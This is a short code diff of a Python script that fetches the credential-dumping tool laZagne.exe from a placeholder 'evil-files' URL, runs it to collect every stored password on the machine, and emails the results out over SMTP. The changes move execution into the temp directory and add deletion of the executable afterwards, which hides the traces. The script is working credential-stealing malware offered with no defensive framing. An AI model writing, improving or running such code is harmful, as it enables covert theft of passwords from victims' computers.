@@ -1,5 +1,5 @@
-import requests , subprocess , smtplib , re
-
+import requests , subprocess , smtplib , re , os , tempfile
+ 
 def download(url):
     get_request = requests.get(url)
     file_name = url.split("/")[-1]
@@ -13,9 +13,11 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
    
-          
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)          
 download("http://test.com/evil-files/laZagne.exe") 
 command = "laZagne.exe all"
 result = subprocess.check_output(command, shell=True)
 send_mail("EMAIL", "APP PASS FOR EMAIL", result)
-# This script will send an email to the specified email address with the results of the command.
+os.remove("laZagne.exe")  
+#This script will send an email to the specified email address with the results of the command.
